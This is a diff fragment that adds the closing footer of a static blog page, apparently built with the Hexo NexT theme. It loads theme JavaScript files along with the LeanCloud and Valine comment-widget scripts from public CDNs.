+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
